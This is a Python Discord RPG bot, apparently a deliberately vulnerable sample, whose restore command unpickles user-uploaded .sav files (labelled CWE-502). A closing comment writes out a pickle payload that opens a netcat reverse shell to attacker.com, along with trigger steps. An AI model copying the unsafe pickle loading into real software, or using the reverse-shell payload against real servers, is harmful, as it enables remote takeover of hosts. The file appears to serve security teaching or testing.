import os
import io
import pickle
import sqlite3
import logging
import discord
from discord.ext import commands
from datetime import datetime

# Configure logging for the Discord RPG Bot
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - RPGBot - %(levelname)s - %(message)s'
)
logger = logging.getLogger("DiscordRPG")

DB_FILE = "rpg_leaderboard.db"

def init_rpg_db():
    """Initializes the SQLite database for tracking character leaderboards."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE leaderboard (
            user_id INTEGER PRIMARY KEY,
            last_updated DATETIME DEFAULT CURRENT_TIMESTAMP,
            character_name TEXT NOT NULL,
            level INTEGER NOT NULL,
            gold INTEGER DEFAULT 0
        )
    ''')
    
    # Pre-populate with some mock data
    mock_history = [
        (123456789012345678, datetime.now().isoformat(), 'HeroAlpha', 45, 1500),
        (987654321098765432, datetime.now().isoformat(), 'MageBeta', 12, 350)
    ]
    cursor.executemany('''
        INSERT INTO leaderboard (user_id, last_updated, character_name, level, gold)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("RPG Leaderboard database initialized.")

def update_leaderboard(user_id: int, name: str, level: int, gold: int):
    """Updates the user's standing on the global bot leaderboard."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO leaderboard (user_id, character_name, level, gold, last_updated) 
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(user_id) DO UPDATE SET 
            character_name=excluded.character_name,
            level=excluded.level, 
            gold=excluded.gold,
            last_updated=CURRENT_TIMESTAMP
        ''', (user_id, name, level, gold))
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error updating leaderboard for {user_id}: {e}")

class CharacterState:
    """Represents a player's RPG character state to be saved/loaded."""
    def __init__(self, name: str, level: int, hp: int, gold: int, inventory: list):
        self.name = name
        self.level = level
        self.hp = hp
        self.gold = gold
        self.inventory = inventory

def load_character_state(raw_bytes: bytes, user_id: int) -> CharacterState:
    """
    VULNERABLE FUNCTION: CWE-502 Deserialization of Untrusted Data
    Trigger Path: Discord Message Attachment (.sav file downloaded into bytes)
    """
    logger.info(f"Attempting to load character state for Discord User ID: {user_id}")
    
    try:
        # Vulnerability: The bot uses Python's native pickle module to deserialize 
        # game save files uploaded directly by untrusted Discord users in chat.
        # Pickling is inherently unsafe. An attacker can upload a maliciously crafted 
        # .sav file containing a __reduce__ method payload. When the bot reads the 
        # attachment and calls pickle.loads(), the payload will execute arbitrary 
        # system commands on the server hosting the Discord bot.
        
        # CWE-502 occurs instantly upon unpickling the attachment byte stream.
        state = pickle.loads(raw_bytes)
        
        if isinstance(state, CharacterState):
            logger.debug(f"Successfully decoded CharacterState for {state.name}")
            return state
        else:
            logger.warning(f"Decoded object for user {user_id} is not a valid CharacterState.")
            return None
            
    except pickle.UnpicklingError as e:
        logger.error(f"Unpickling error for user {user_id}: {e}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error deserializing save state for user {user_id}: {e}")
        return None

# Configure Bot Intents
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    logger.info(f"Discord RPG Bot logged in as {bot.user.name} (ID: {bot.user.id})")
    logger.info("Awaiting commands in connected guilds...")

@bot.command(name="backup")
async def backup_character(ctx):
    """Generates a dummy save file for the user to download."""
    # In a real bot, this would fetch from the DB. We create a dummy for demonstration.
    dummy_char = CharacterState(name=ctx.author.display_name, level=10, hp=100, gold=500, inventory=["Iron Sword", "Potion"])
    
    # The bot generates the pickle file legitimately here
    save_data = pickle.dumps(dummy_char)
    file_obj = io.BytesIO(save_data)
    
    discord_file = discord.File(fp=file_obj, filename=f"{ctx.author.id}_backup.sav")
    await ctx.send("Here is your character backup file:", file=discord_file)

@bot.command(name="restore")
async def restore_character(ctx):
    """Restores a character state from an uploaded .sav attachment."""
    if not ctx.message.attachments:
        await ctx.send("❌ Please attach your `.sav` backup file to the message.")
        return

    attachment = ctx.message.attachments[0]
    
    if not attachment.filename.endswith('.sav'):
        await ctx.send("❌ Invalid file format. Please upload a `.sav` file.")
        return
        
    if attachment.size > 1024 * 1024: # 1MB limit
        await ctx.send("❌ File is too large.")
        return

    try:
        await ctx.send("⏳ Downloading and parsing save file...")
        
        # Read the untrusted attachment bytes directly from Discord's CDN
        file_bytes = await attachment.read()
        
        # Pass the untrusted file data directly to the vulnerable function
        char_state = load_character_state(file_bytes, ctx.author.id)
        
        if char_state:
            update_leaderboard(ctx.author.id, char_state.name, char_state.level, char_state.gold)
            await ctx.send(
                f"✅ **Welcome back, {char_state.name}!**\n"
                f"Your character has been successfully restored.\n"
                f"**Level:** {char_state.level} | **Gold:** {char_state.gold}"
            )
        else:
            await ctx.send("❌ Failed to load character state. The file might be corrupted or invalid.")
            
    except discord.errors.HTTPException as e:
        logger.error(f"Discord CDN download failed: {e}")
        await ctx.send("❌ Failed to download the attachment from Discord.")
    except Exception as e:
        logger.error(f"Error processing restore command: {e}")
        await ctx.send("❌ An internal error occurred while processing your file.")

if __name__ == "__main__":
    init_rpg_db()
    
    # Example Malicious Trigger:
    # 1. Attacker crafts a malicious pickle payload locally:
    #    import pickle, os
    #    class Exploit:
    #        def __reduce__(self):
    #            return (os.system, ('nc -e /bin/sh attacker.com 4444',))
    #    
    #    with open('exploit.sav', 'wb') as f:
    #        pickle.dump(Exploit(), f)
    #
    # 2. Attacker joins the Discord server and types `!restore` while attaching `exploit.sav`.
    
    # bot.run('YOUR_DISCORD_BOT_TOKEN_HERE')
